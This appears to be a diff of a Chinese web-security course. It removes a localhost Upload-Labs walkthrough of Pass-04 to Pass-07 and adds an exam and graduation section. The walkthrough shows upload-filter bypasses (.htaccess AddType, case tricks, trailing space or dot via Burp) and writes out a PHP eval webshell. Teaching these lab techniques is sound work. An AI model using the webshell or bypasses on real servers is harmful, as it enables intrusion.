-那这个 `.htaccess` 文件能干什么呢？能干的事情可多了！比如：
-- 网址重写（伪静态）
-- 301重定向
-- 设置404错误页
-- 禁止访问某些文件
-- **设置文件解析规则**（这就是我们要利用的！）
-- ……
-
-而我们最关心的就是最后一条——**设置文件解析规则**。我们可以在 `.htaccess` 里写一句话，让服务器把某个后缀（比如 `.jpg`）当作PHP来解析！
-
-哇，那这就厉害了！如果服务器允许 `.htaccess` 文件生效，那我们就可以：
-1. 上传一个 `.htaccess` 文件，让服务器把 `.jpg` 当PHP解析
-2. 再上传一个内容是PHP代码的 `.jpg` 文件（比如一句话木马）
-3. 访问这个 `.jpg` 文件，它就会被当作PHP执行！
-
-这样就绕开了后缀名检查——因为我上传的确实是 `.jpg` 文件啊，白名单也能过！
-
-是不是很巧妙？😎
-
-### 前提条件 ⚠️
-
-但是，这个方法有几个前提条件：
-
-1. **服务器是Apache** —— .htaccess是Apache的东西，Nginx、IIS不支持
-2. **服务器允许.htaccess生效** —— 也就是主配置里设置了 `AllowOverride All`（或者至少允许FileInfo）
-3. **我们能上传.htaccess文件** —— 文件名过滤没把它拦住
-
-这三个条件缺一不可。不过在我们的Upload-Labs环境里，这些条件都满足，所以放心用！
-
-### .htaccess怎么写？📝
-
-我们的 `.htaccess` 文件内容很简单，就写一句话：
-
-```apache
-AddType application/x-httpd-php .jpg
-```
-
-这句话是什么意思呢？
-- `AddType` —— 添加一个MIME类型映射
-- `application/x-httpd-php` —— PHP的MIME类型，意思是"当作PHP来执行"
-- `.jpg` —— 对哪个后缀生效
-
-合起来就是：**告诉服务器，把 .jpg 后缀的文件当作PHP来执行！**
-
-当然，你也可以换成别的后缀，比如 `.png`、`.gif`，都行。
-
-除了 `AddType`，还有另一种写法：
-
-```apache
-<FilesMatch "shell.jpg">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-```
-
-这个意思是：匹配文件名叫 `shell.jpg` 的文件，把它当作PHP处理。这种写法更精准，只针对特定的文件。
-
-不过第一种更简单，我们就用第一种吧。
-
-### 绕过思路 💡
-
-思路很清晰，分两步走：
-
-**第一步：上传 .htaccess 文件**
-让服务器把 .jpg 当作PHP解析。
-
-**第二步：上传 shell.jpg**
-内容是一句话木马，但是后缀是.jpg，因为我们要的就是.jpg后缀。
-
-然后访问 shell.jpg，它就会被当作PHP执行了！
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：准备.htaccess文件 📄
-
-首先，我们要创建一个 `.htaccess` 文件。
-
-注意哦，这个文件的名字就是 `.htaccess`，前面有个点，而且没有后缀名（或者说整个文件名就是后缀名）。
-
-在Windows下怎么创建这种"只有后缀没有文件名"的文件呢？
-
-有个小技巧：新建一个文本文档，然后重命名的时候，输入 `.htaccess.`（注意最后还有个点），然后按回车，Windows就会自动把它变成 `.htaccess` 了。😏
-
-或者用命令行也行。
-
-创建好之后，用记事本打开，输入内容：
-
-```
-AddType application/x-httpd-php .jpg
-```
-
-然后保存。注意编码要是ANSI或者UTF-8，别搞错了。
-
-#### 第二步：上传.htaccess文件 📤
-
-现在，我们来上传这个 `.htaccess` 文件。
-
-选择文件，找到 `.htaccess`，然后上传。
-
-哎？等一下，这一关是黑名单，`.htaccess` 没有后缀（或者说后缀不是.php之类的），它会不会被拦？
-
-答案是：一般不会。因为黑名单禁的是 .php、.asp 这些脚本后缀，`.htaccess` 不在黑名单里。而且很多开发者根本想不到有人会传 `.htaccess` 文件。
-
-上传成功了吗？如果成功了，那就太好了！
-
-如果没成功？别急，可能文件名不对，或者被拦了。那你可以试试把文件名改成别的？不行不行，.htaccess必须叫这个名字才能生效。
-
-不过在Upload-Labs的Pass-04里，应该是能传上去的。
-
-#### 第三步：准备shell.jpg 🖼️
-
-接下来，我们准备第二个文件——`shell.jpg`。
-
-注意，这个文件的**内容**是PHP一句话木马，但是**后缀**是 `.jpg`。
-
-怎么做？很简单：
-- 新建一个文本文档
-- 输入一句话木马：`<?php @eval($_POST['shell']); ?>`
-- 保存为 `shell.jpg`（注意后缀改成.jpg）
-
-搞定！
-
-💡 **注意**：这一关不需要图片马（就是前面是图片内容后面加PHP代码那种），因为这一关不检查文件内容，只检查后缀。所以直接写PHP代码保存为.jpg就行。当然，你做成图片马也可以，就是没必要。
-
-#### 第四步：上传shell.jpg 📤
-
-好，现在上传 `shell.jpg`。
-
-因为后缀是 `.jpg`，在黑名单里肯定没有（黑名单禁的是.php那些），所以肯定能传上去。
-
-上传成功！🎉
-
-#### 第五步：访问shell.jpg，验证效果 🔍
-
-现在，两个文件都传上去了。我们来访问一下 `shell.jpg`，看看它会不会被当作PHP执行。
-
-用蚁剑连接一下试试：
-- URL地址：`http://localhost/upload-labs/upload/shell.jpg`
-- 密码：`shell`
-
-测试连接……
-
-成功了吗？🎉
-
-如果成功了，那就说明我们的 `.htaccess` 生效了！服务器真的把 `.jpg` 文件当作PHP来解析了！
-
-是不是很神奇？明明是个jpg文件，里面却是PHP代码，还能执行！😱
-
-### 源码分析 🔬
-
-好，我们来看看这一关的源码，感受一下这一关的黑名单有多全。
-
-点击"查看源码"：
-
-```php
-<?php
-$is_upload = false;
-$msg = null;
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
-        $file_name = trim($_FILES['upload_file']['name']);
-        $file_name = deldot($file_name);
-        $file_ext = strrchr($file_name, '.');
-        $file_ext = strtolower($file_ext);
-        $file_ext = trim($file_ext);
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '此文件不允许上传!';
-        }
-    } else {
-        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-我的天！看到这黑名单数组了吗？
-
-```php
-$deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
-```
-
-我的妈呀，这也太长了吧！基本上能想到的脚本后缀都禁了，还考虑了大小写的情况（比如 `.pHp`、`.aSp` 都禁了）。
-
-但是！这么长的黑名单，还是漏了一个东西——**`.htaccess`**！😂
-
-`.htaccess` 这个文件，它没有传统意义上的后缀名（或者说整个名字就是后缀名）。你看代码里取后缀的方式是 `strrchr($file_name, '.')`，也就是找最后一个点，取后面的部分。
-
-那 `.htaccess` 的最后一个点在哪？就在最开头啊！所以 `strrchr('.htaccess', '.')` 取出来的是 `.htaccess` 整个字符串？不对，我们来想一下：
-
-`.htaccess` 这个文件名，第一个字符就是点，后面是 `htaccess`。那最后一个点就是第一个（也是唯一一个）点。所以 `strrchr` 会返回从最后一个点开始的后面的内容，也就是 `.htaccess`。
-
-那它在黑名单里吗？不在！黑名单里都是 `.php`、`.asp` 这些，没有 `.htaccess`。
-
-所以就被绕过去了！
-
-这就是为什么说黑名单不可靠——你永远不知道还有什么奇奇怪怪的文件能被利用。你考虑到了各种脚本后缀，但你没想到还有 `.htaccess` 这种配置文件可以利用！🤷‍♂️
-
-### 小结 📝
-
-Pass-04告诉我们：
-
-> **黑名单哪怕列得再全，也可能有遗漏。而且除了脚本文件，还有其他类型的文件可以被利用，比如.htaccess配置文件。**
-
-这一关也让我们见识了 `.htaccess` 的威力——一个小小的配置文件，就能改变整个目录的文件解析规则。
-
-当然，还是那句话，这个方法只适用于Apache，而且需要服务器允许 `.htaccess` 生效。如果是Nginx服务器，这招就不好使了。不过没关系，Nginx有Nginx的玩法，后面我们会学到。
-
-好，第四关搞定，继续第五关！🎮
+**二、实操题（每题 25 分，共 2 题 = 50 分）**
+
+11. **实操一：DVWA SQL Blind High 级别，30 分钟内**
+   切 high 级别，写出 Python 脚本（可以用 Day16 的模板），**自动输出**：
+   - 当前数据库名
+   - 当前库下第一张表的表名
+
+12. **实操二：DVWA File Upload High 级别，20 分钟内**
+   切 high 级别，上传一张带 PHP 一句话的图片马，然后结合文件包含（File Inclusion）模块，**执行 `phpinfo()` 并截图**。
 
 ---
 
-## Pass-05：大小写绕过 🎯
-
-### 关卡介绍 📋
-
-第五关，大小写绕过。
-
-这一关的黑名单呢，说全也挺全的，但是……它**没有把后缀转成小写！**
-
-这就有漏洞可钻了！
-
-### 什么是大小写绕过？🤔
-
-我们知道，**Windows系统是不区分大小写的**。什么意思呢？就是在Windows里，`shell.php`、`shell.Php`、`shell.PHP`、`shell.pHp`……这些都被认为是同一个文件。
-
-比如你在Windows里新建一个文件叫 `test.txt`，然后你想再新建一个叫 `TEST.txt`，系统会告诉你"已经有同名文件了"。因为Windows不区分大小写，它觉得这俩是同一个名字。
-
-但是Linux系统呢？**Linux是区分大小写的**。`test.txt` 和 `TEST.txt` 是两个不同的文件。
-
-好，那现在问题来了：如果一个网站是跑在Windows上的（比如用IIS+PHP，或者Apache+PHP on Windows），然后后端代码在检查后缀的时候，**没有统一转成小写**，那会发生什么？
-
-举个例子：
-- 黑名单里有 `.php`，但是没有 `.Php`、`.PHP`、`.pHp`
-- 你上传一个 `shell.php` —— 被拦了（因为黑名单里有.php）
-- 你上传一个 `shell.Php` —— 没被拦（因为黑名单里没有.Php）
-- 但是Windows系统不区分大小写啊！`shell.Php` 在Windows看来就是 `shell.php`，照样会被当作PHP文件解析执行！
-
-这样就绕过去了！是不是很鸡贼？😏
-
-打个比方：学校规定"不准带手机"，但是没说不准带"手機"（繁体）。然后有个学生带了个手机，跟老师说："老师你看清楚，这是'手機'，不是'手机'！"老师一看规定里确实只写了"手机"，没写"手機"，就让他进去了。然后……当然还是手机啊！😂
-
-### 绕过思路 💡
-
-思路很简单：
-
-**把文件后缀改成大小写混合的形式，比如 .Php、.pHp、.PHP、.phP 等等，只要不在黑名单里就行！**
-
-当然，这个方法的前提是：
-1. **服务器是Windows系统**（因为Windows不区分大小写，Linux区分的话就没用了）
-2. **后端代码没有把后缀转成小写/大写再检查**
-
-我们的Upload-Labs环境是Windows的，而且这一关确实没转小写，所以放心用！
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：先传shell.php试试？🤔
-
-还是老规矩，先传 `shell.php` 试试。
-
-肯定被拦，对吧？黑名单里有 .php。
-
-#### 第二步：改成大写试试 🔠
-
-那我们把后缀改成大写，比如改成 `shell.PHP`（全大写）。
-
-然后上传试试？
-
-成功了吗？🎉
-
-如果成功了，那就说明大小写绕过有效！
-
-如果没成功，再试试其他写法，比如 `.Php`、`.pHp`、`.phP` 之类的。不过一般来说，全大写或者首字母大写就够了。
-
-#### 第三步：验证一下 ✅
-
-上传成功了，但是这个 `.PHP` 文件真的能被解析吗？
-
-用蚁剑连接一下试试：
-- URL地址：`http://localhost/upload-labs/upload/shell.PHP`（注意大小写！）
-- 密码：`shell`
-
-等等，URL里的文件名要写对哦，你传的是 `.PHP` 就写 `.PHP`，别写成 `.php` 了。
-
-虽然Windows系统不区分大小写，但是浏览器访问的时候，Web服务器能不能正确识别呢？一般来说Apache在Windows上也是不区分的，所以应该没问题。
-
-如果蚁剑连接成功，那就说明这关过了！🎉
-
-### 源码分析 🔬
-
-好，我们来看看源码，确认一下它是不是没转小写。
-
-点击"查看源码"：
-
-```php
-<?php
-$is_upload = false;
-$msg = null;
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer");
-        $file_name = trim($_FILES['upload_file']['name']);
-        $file_name = deldot($file_name);
-        $file_ext = strrchr($file_name, '.');
-        $file_ext = trim($file_ext);
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH.'/'.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '此文件不允许上传!';
-        }
-    } else {
-        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-来，对比一下上一关的代码，看看少了什么？
-
-上一关有这一行：
-```php
-$file_ext = strtolower($file_ext);
-```
-
-这一关呢？**没有！** 😱
-
-对，就是少了 `strtolower()` 这个转小写的函数！
-
-所以它检查后缀的时候，是区分大小写的。黑名单里有 `.php` 和 `.pHp`，但是没有 `.PHP`、`.Php`、`.phP` 这些。你传一个全大写的 `.PHP`，它一看，不在黑名单里，就放行了。
-
-然后Windows系统不区分大小写，`.PHP` 文件照样被当作PHP解析。于是就绕过了。
-
-而且你发现了吗？这一关的黑名单里有 `.pHp`，说明开发者想到了大小写的问题，但是——他只想到了一种大小写混合的情况，没考虑到其他的！😂
-
-这就是为什么做安全检查的时候，一定要先把数据归一化（比如统一转小写），再去比较。不然就会出这种问题。
-
-### 小结 📝
-
-Pass-05告诉我们：
-
-> **字符串比较之前，一定要先做归一化处理（比如统一转小写），不然大小写不一致就可能导致绕过。**
-
-而且这个方法主要针对Windows服务器，因为Windows不区分大小写。如果是Linux服务器，这招就不好使了，因为Linux区分大小写，你传个 `.PHP` 上去，Linux真的把它当 `.PHP` 文件，而PHP配置里一般只配置了 `.php` 后缀的解析，所以不会执行。
-
-不过现在很多网站都是跑在Linux上的，所以大小写绕过的场景相对少一些。但是了解一下还是有必要的，万一遇到Windows服务器呢？对吧？
-
-好，第五关搞定，继续第六关！🎮
+**📜 毕业证书评分标准：**
+- **90+ 分** 🥇 金牌毕业生：直接进阶段 ② 挑战 Pikachu SSRF/XXE 新漏洞，PTE 机试已经问题不大！
+- **80+ 分** 🎓 正式毕业生：可以开始 SQLi-Labs Less1-25 冲刺，同时把 CheatSheet 每天过一遍
+- **60+ 分** ✅ 合格毕业生：针对错题的章节回去复习一遍，特别是命令注入 Payload 大全和盲注 Python 脚本
+- **60 分以下** 🔧 重修建议：Day8（XSS）、Day10（SQLi）、Day16（盲注）这三章重新看一遍 + 重打对应模块，三周后再测
 
 ---
 
-## Pass-06：空格绕过 🎯
+## 19.6 写在最后：致即将从 DVWA 毕业的你 💌
 
-### 关卡介绍 📋
+**亲爱的同学们，**
 
-第六关，空格绕过。
+如果你是零基础从 Day1 一路看到这一章，我要真诚地对你说一句：**你真的很棒！** 👍
 
-这一关又有什么新花样呢？这一关的开发者变聪明了——他把后缀转成小写了！所以大小写绕不过去了。
+安全行业的入门并不容易——很多人在"装环境装一周还没成功"的时候就放弃了，很多人在看到第一个 UNION SELECT 的时候不知道从哪下手，很多人看到 Python 盲注脚本长几百行直接关了页面。但你坚持下来了，你把 14 个核心模块、4 个难度级别、100+ 个真实 Payload、6 个自动化脚本全部走过了一遍。
 
-但是呢，他又忽略了另一件事——**文件名后面的空格！**
+**你已经拿到了进入安全行业的第一张船票。** 🚢
 
-### 什么是空格绕过？🤔
+但我也想诚实地告诉你：**通关 DVWA 只是起点，不是终点。** 真实世界的站点比 DVWA 复杂 100 倍——它有 WAF、有宝塔、有云盾、有日志审计、有安全运营团队 24 小时盯着。未来你会遇到 SQL 绕 WAF 用 20 种编码嵌套，会遇到上传点白名单校验写死到文件头字节级，会遇到反序列化的 POP 链需要你看懂 PHP 内核。
 
-**空格绕过**，就是在文件名的后缀后面加一个空格，比如 `shell.php `（注意php后面有个空格）。
+**但别怕！** 因为你已经掌握了最最核心的东西——**"攻击者思维 + 原理派学习法"**：
+- 看到每一段代码，你都会本能地问：**"这个变量从哪里来？有没有被过滤？最终拼接进了哪个危险函数？"**
+- 遇到每一个报错，你都会本能地想：**"这是 MySQL 报错还是 PHP 报错？能不能注入？能不能外带数据？"**
 
-为什么加个空格就能绕过？
+**这就是 DVWA 这 15 天教给你最值钱的东西——不是那 100 个 Payload，而是"永远站在攻击者角度想问题"的习惯。**
 
-我们来想一下：
-- 后端代码取后缀的时候，比如从 `shell.php ` 里取后缀，取到的是 `.php `（注意后面有个空格）
-- 然后去黑名单里比对，黑名单里是 `.php`（没有空格），所以比对不上
-- 然后文件保存到Windows系统上，Windows系统会**自动去掉文件名末尾的空格**，所以实际保存的文件名还是 `shell.php`
-- 于是，这个文件就能被当作PHP执行了！
+最后，送给你一句我特别喜欢的话，贴在你桌面上激励接下来的半年：
 
-哇，是不是很巧妙？😏
+> **"安全之路，道阻且长；行则将至，做则必成。"**
 
-打个比方：学校规定"不准带手机"，然后有个学生把手机放在一个写着"手 机"（中间有个空格）的盒子里，跟老师说："老师你看，我带的是'手 机'，不是'手机'！"老师一看规定里确实只写了"手机"，没写"手 机"，就让他进去了。结果进了校门，盒子上的空格自己消失了，又变成"手机"了……😂
-
-### 前提条件 ⚠️
-
-这个方法也有前提：
-
-1. **服务器是Windows系统** —— 因为Windows会自动去掉文件名末尾的空格，Linux不会
-2. **后端代码没有trim掉文件名首尾的空格** —— 如果代码里有 `trim()`，那空格就被去掉了，没用了
-
-我们的Upload-Labs是Windows环境，而且这一关确实没trim，所以放心用！
-
-### 绕过思路 💡
-
-思路很简单：
-
-**Burp抓包，在文件名后面加个空格，让后缀名带空格，这样黑名单匹配不上。保存到Windows上之后空格会被自动去掉，所以实际还是.php文件。**
-
-为什么要Burp抓包改？因为你在本地给文件名加空格的话，Windows会自动帮你去掉……你试试就知道了，在Windows里给文件重命名，后面加空格，一刷新空格就没了。所以得在传输过程中改，也就是抓包改。
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：Burp抓包 🕵️
-
-老规矩，打开Burp，开启拦截。
-
-选择 `shell.php` 文件，点击上传，让Burp抓到包。
-
-#### 第二步：文件名后面加空格 ✏️
-
-在Burp抓到的请求包里，找到filename那一行：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php"
-```
-
-我们在 `shell.php` 后面加一个空格，变成这样：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php "
-```
-
-注意哦，是在双引号里面，`.php` 后面加一个空格。
-
-#### 第三步：放包，上传成功！🎉
-
-改完之后，点击Forward放包。
-
-回到浏览器，看看是不是上传成功了？
-
-🎉 恭喜你！又搞定一关！
-
-#### 第四步：验证一下 ✅
-
-上传成功了，那这个文件到底叫啥？是 `shell.php` 还是 `shell.php `（带空格）？
-
-我们来验证一下。怎么验证呢？
-
-**方法一：直接访问不带空格的地址**
-
-访问 `http://localhost/upload-labs/upload/shell.php`（不带空格），看看能不能访问到。
-
-如果能访问到（空白页或者能执行），那就说明Windows自动把空格去掉了，实际文件名是 `shell.php`。
-
-**方法二：用蚁剑连接**
-
-直接用蚁剑连接 `http://localhost/upload-labs/upload/shell.php`（不带空格），密码 `shell`。
-
-如果连接成功，那就说明没问题！
-
-一般来说都是没问题的，因为Windows会自动去掉文件名末尾的空格。
-
-### 源码分析 🔬
-
-好，我们来看看源码，确认一下它是不是没trim。
-
-点击"查看源码"：
-
-```php
-<?php
-$is_upload = false;
-$msg = null;
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer");
-        $file_name = $_FILES['upload_file']['name'];
-        $file_name = deldot($file_name);
-        $file_ext = strrchr($file_name, '.');
-        $file_ext = strtolower($file_ext);
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH.'/'.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '此文件不允许上传!';
-        }
-    } else {
-        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-来，对比上一关的代码，看看有什么变化？
-
-上一关没有 `strtolower()`，这一关**有了**：
-```php
-$file_ext = strtolower($file_ext);
-```
-
-所以大小写绕过不好使了。
-
-但是，这一关**没有** `trim()`！
-
-你看这一行：
-```php
-$file_name = $_FILES['upload_file']['name'];
-```
-
-直接就拿文件名用了，没有 `trim()`。后面取后缀的时候，后缀后面也带着空格。然后去黑名单里比对，黑名单里的 `.php` 是没有空格的，所以比对不上，就放行了。
-
-然后保存文件的时候，Windows自动把末尾的空格去掉了，所以实际保存的是 `shell.php`。
-
-于是就绕过了！
-
-而且你注意到了吗？上一关其实也没有 `trim()`，但是上一关我们用的是大小写绕过。这一关开发者修复了大小写的问题（加了strtolower），但是忘了加 `trim()`。
-
-哈哈，开发者：我补了一个漏洞，又漏了另一个！🤦‍♂️
-
-### 小结 📝
-
-Pass-06告诉我们：
-
-> **处理文件名的时候，一定要记得trim掉首尾的空格（还有其他空白字符），不然在Windows系统下可能被空格绕过。**
-
-又是一个针对Windows的绕过方法。还是那句话，虽然现在Linux服务器多，但Windows的服务器也不少，尤其是一些企业内部系统，很可能是Windows的。多学点总是没错的。
-
-好，第六关搞定，继续第七关！🎮
+明天 Day20，我们 SQLi-Labs Less1-10 正式见！**同学们，毕业快乐！下一站，SQL 注入大拿！** 🚀🎊
 
 ---
-
-## Pass-07：点号绕过 🎯
-
-### 关卡介绍 📋
-
-第七关，点号绕过。
-
-这一关跟第六关很像，但是呢，它**加了trim()**！所以空格绕不过去了。
-
-但是！它又漏了一个东西——**文件名末尾的点号（.）！**
-
-### 什么是点号绕过？🤔
-
-**点号绕过**，就是在文件名的最后加一个点，比如 `shell.php.`（注意最后有个点）。
-
-为什么加个点就能绕过？原理跟空格绕过差不多：
-
-- 后端代码取后缀的时候，从 `shell.php.` 里取后缀，取到的是啥？`strrchr` 找最后一个点，最后一个点在最末尾，所以取出来的是 `.`（就是一个点）
-- 然后去黑名单里比对，黑名单里是 `.php`、`.asp` 这些，当然没有 `.`，所以比对不上
-- 然后文件保存到Windows系统上，Windows系统会**自动去掉文件名末尾的点号**，所以实际保存的文件名还是 `shell.php`
-- 于是，又绕过了！
-
-是不是跟空格绕过的套路一模一样？就是把空格换成了点号而已。😏
-
-还是那个学校的例子：学生这次带了个写着"手机."（后面有个点）的盒子，老师一看规定里是"手机"，没有"手机."，就让他进去了。结果进了校门，末尾的点自己消失了……😂
-
-### 前提条件 ⚠️
-
-跟空格绕过一样，前提是：
-
-1. **服务器是Windows系统** —— Windows会自动去掉文件名末尾的点，Linux不会
-2. **后端代码没有处理末尾的点** —— 比如没有 `deldot()` 之类的函数
-
-我们的Upload-Labs环境是Windows，而且这一关确实没处理末尾的点，所以放心用！
-
-### 绕过思路 💡
-
-思路跟空格绕过差不多：
-
-**Burp抓包，在文件名最后加一个点号（.），让后缀名匹配不上黑名单。保存到Windows上之后点号会被自动去掉，实际还是.php文件。**
-
-为什么也要抓包改？因为你在Windows本地给文件名最后加点的话，Windows也会自动帮你去掉……不信你试试，新建个文件叫 `test.php.`，一保存就变成 `test.php` 了。所以得抓包改。
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：Burp抓包 🕵️
-
-老规矩，打开Burp，开启拦截。
-
-选择 `shell.php` 文件，点击上传，让Burp抓到包。
-
-#### 第二步：文件名后面加点号 ✏️
-
-在Burp抓到的请求包里，找到filename那一行：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php"
-```
-
-我们在 `shell.php` 后面加一个点，变成这样：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php."
-```
-
-注意哦，是在双引号里面，最后面加一个点。
-
-#### 第三步：放包，上传成功！🎉
-
-改完之后，点击Forward放包。
-
-回到浏览器，看看是不是上传成功了？
-
-🎉 又搞定了！是不是感觉找到规律了？
-
-#### 第四步：验证一下 ✅
-
-老规矩，验证一下。用蚁剑连接 `http://localhost/upload-labs/upload/shell.php`（不带点），密码 `shell`。
-
-如果连接成功，那就说明没问题！Windows确实自动把末尾的点去掉了。
-
-### 源码分析 🔬
-
-好，我们来看看源码。
-
-点击"查看源码"：
-
-```php
-<?php
-$is_upload = false;
-$msg = null;
-if (isset($_POST['submit'])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer");
-        $file_name = trim($_FILES['upload_file']['name']);
-        $file_ext = strrchr($file_name, '.');
-        $file_ext = strtolower($file_ext);
-        $file_ext = trim($file_ext);
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES['upload_file']['tmp_name'];
-            $img_path = UPLOAD_PATH.'/'.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = '上传出错！';
-            }
-        } else {
-            $msg = '此文件不允许上传!';
-        }
-    } else {
-        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
-    }
-}
-?>
-```
-
-对比上一关，看看有什么变化？
-
-上一关没有 `trim()`，这一关**有了**，而且还trim了两次：
-- 一次是trim文件名：`$file_name = trim($_FILES['upload_file']['name']);`
-- 一次是trim后缀：`$file_ext = trim($file_ext);`
-
-所以空格绕过不好使了。
-
-但是！这一关**没有处理末尾的点号**！
-
-你看，上几关的代码里有个 `deldot($file_name)` 函数，用来去掉末尾的点。这一关呢？**没有！**
-
-所以当文件名是 `shell.php.` 的时候：
-1. trim() —— 末尾是点，不是空格，所以trim不掉，文件名还是 `shell.php.`
-2. strrchr() 找最后一个点 —— 最后一个点在末尾，所以取出来的后缀是 `.`（就一个点）
-3. strtolower() —— 点转小写还是点
-4. trim() —— 点不是空格，trim不掉
-5. 去黑名单比对 —— 黑名单里没有 `.`，所以通过
-6. 保存文件 —— Windows自动去掉末尾的点，变成 `shell.php`
-7. 执行 —— 成功getshell！
-
-完美绕过！😎
-
-而且你发现了吗？Pass-03那关其实有 `deldot()` 函数的，这一关反而没有了。看来作者是故意的，一关一换，让我们逐个练习这些绕过方法。哈哈，用心良苦啊！😂
-
-### 小结 📝
-
-Pass-07告诉我们：
-
-> **处理文件名的时候，不仅要trim空格，还要注意处理末尾的点号（.），不然在Windows系统下可能被点号绕过。**
-
-到这里，我们已经学了好几种针对Windows的绕过方法了：
-- 大小写绕过（Pass-05）
-- 空格绕过（Pass-06）
-- 点号绕过（Pass-07）
-
-这些方法都是利用了Windows系统的特性（不区分大小写、自动去掉末尾的空格和点），再加上后端代码考虑不周，导致的绕过。
-
-这也告诉我们：**写代码的时候，一定要考虑周全，各种边界情况都要想到。** 不然你以为自己做得挺好，其实到处都是漏洞。🤷‍♂️
-
----
-
-## 本章总结 📚
-
-好了，前7关我们都打完了！是不是感觉收获满满？我们来总结一下这一章都学了啥。
-
-### 核心知识点回顾 🧠
-
-#### 1. Upload-Labs靶场
-- 专门练文件上传漏洞的靶场，一共21关
-- 建议用作者提供的专用集成环境（PHP 5.2.17），别自己用新版PHP配
-- 一关一关打，每关打完都要看源码，理解原理
-
-#### 2. 前7关通关一览
-
-| 关卡 | 过滤方式 | 绕过方法 | 关键原因 |
-|------|----------|----------|----------|
-| **Pass-01** | 前端JS验证 | 抓包改文件名 / 禁用JS / 改JS代码 | 前端验证不可信，所有检查都在浏览器端 |
-| **Pass-02** | MIME类型验证（Content-Type） | 抓包改Content-Type为image/jpeg | Content-Type是客户端传的，可以随意篡改 |
-| **Pass-03** | 黑名单验证（后缀少） | 用特殊后缀（.php3/.php5/.phtml等） | 黑名单列不全，总有漏掉的后缀 |
-| **Pass-04** | 黑名单验证（后缀全） | 上传.htaccess文件，让.jpg当PHP解析 | 黑名单漏了.htaccess这种配置文件 |
-| **Pass-05** | 黑名单（没转小写） | 大小写绕过（.Php/.PHP等） | Windows不区分大小写，代码没统一转小写 |
-| **Pass-06** | 黑名单（没trim） | 空格绕过（.php后面加空格） | Windows自动去末尾空格，代码没trim |
-| **Pass-07** | 黑名单（没去末尾点） | 点号绕过（.php后面加点） | Windows自动去末尾点，代码没处理 |
-
-#### 3. 几个重要的道理
-
-通过这7关，我们可以总结出几个非常重要的道理：
-
-**① 前端验证不可信！** 🚫
-所有在浏览器里做的验证（JS检查、浏览器限制），都只能提升用户体验，绝对不能当安全措施。安全验证必须在后端做。
-
-**② 客户端传来的东西都不可信！** 🚫
-不仅是JS验证，还有HTTP头里的Content-Type，还有文件名，这些都是客户端传来的，都可以改，都不能信。
-
-**③ 黑名单机制不靠谱！** 🚫
-黑名单很难列全所有危险情况，总会有遗漏。相比之下，白名单要可靠得多。
-
-**④ Windows系统特性可能被利用！** 🪟
